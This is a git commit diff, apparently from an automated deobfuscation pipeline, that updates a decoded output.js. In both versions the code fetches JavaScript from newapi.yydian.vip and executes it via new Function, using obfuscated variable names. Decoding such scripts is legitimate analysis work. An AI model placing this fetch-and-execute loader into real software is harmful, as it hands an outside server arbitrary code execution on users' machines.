316635dbfe66d59618a612d7dd5fec8f4af68b1d
action <action@github.com>
2025-05-14 14:11:30 +0000

    Add decoded output file

--- output.js
+++ output.js
@@ -1,10 +1,10 @@
 
-fetch("https://newapi.yydian.vip/weidao/new/dmj/js/popup.js").then(_0x15c71e => {
-  if (!_0x15c71e.ok) throw new Error("请检查网络是否OK");
-  return _0x15c71e.text();
-}).then(_0x321032 => {
-  const _0x555f2f = new Function(_0x321032);
-  _0x555f2f();
-}).catch(_0x12e0c6 => {
+fetch("https://newapi.yydian.vip/weidao/new/dmj/js/nav.js").then(_0x345f45 => {
+  if (!_0x345f45.ok) throw new Error("请检查网络是否OK");
+  return _0x345f45.text();
+}).then(_0x20f448 => {
+  const _0x50d63d = new Function(_0x20f448);
+  _0x50d63d();
+}).catch(_0x15fa6b => {
   reject();
 });
